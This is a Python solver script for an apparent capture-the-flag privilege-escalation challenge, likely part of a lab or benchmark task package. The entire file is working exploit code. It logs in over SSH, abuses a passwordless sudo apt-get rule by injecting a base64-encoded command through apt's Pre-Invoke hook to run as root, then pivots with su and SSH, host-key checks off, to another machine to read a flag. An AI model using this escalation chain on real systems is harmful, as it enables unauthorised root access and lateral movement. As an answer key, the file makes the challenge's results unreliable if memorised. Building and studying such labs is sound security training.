#!/usr/bin/env python3
"""Solver for the multi-container privilege-escalation example.

Chain: log into `work` as Eve with the issued credentials, abuse the
passwordless `sudo apt-get` rule so apt's Pre-Invoke hook runs code as root,
then (as root) become Alice's work account and SSH to her home machine with
her key to read the flag.

The whole chain runs as a single non-interactive command and the flag is
fenced by markers, so the solver never depends on shell prompt strings.
"""
import base64
import json

from pwnlib.tubes import ssh

with open("metadata.json") as f:
    md = json.load(f)

MARKER = "___FLAG___"

# Runs as root via apt's Pre-Invoke hook: switch to asmith and use his key and
# SSH config to reach Alice's home machine and print the flag between markers.
pivot = (
    "su - asmith -c "
    "'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
    "home cat flag.txt'"
)
# base64 keeps the nested quoting out of the apt option we pass on the command line.
hook = f"echo {MARKER}; echo {base64.b64encode(pivot.encode()).decode()} | base64 -d | bash; echo {MARKER}"
# Empty apt sources keep `apt-get update` from reaching the network: the
# Pre-Invoke hook still runs as root, but the command returns immediately.
command = (
    "sudo apt-get update "
    "-o Dir::Etc::sourcelist=/dev/null -o Dir::Etc::sourceparts=/dev/null "
    f'-o APT::Update::Pre-Invoke::="{hook}" 2>/dev/null'
)

s = ssh.ssh(host="work", user=md["username"], password=md["password"])
# ssh.system() execs the command like `ssh host command` — no remote Python
# interpreter required (unlike run_to_end/process).  Empty apt sources mean the
# command exits promptly, so recvall (bounded by a timeout) returns the whole
# output without hanging on a network fetch.
io = s.system(command)
output = io.recvall(timeout=90)
io.close()
s.close()

# Require both fences: a broken exploit (privesc no longer fires, no marker in
# the output) then raises a clear error instead of writing garbage to `flag`.
parts = output.split(MARKER.encode())
if len(parts) < 3:
    raise RuntimeError("no marker-fenced flag in output; the exploit did not run")
flag = parts[1].strip().decode()

with open("flag", "w") as f:
    f.write(flag)
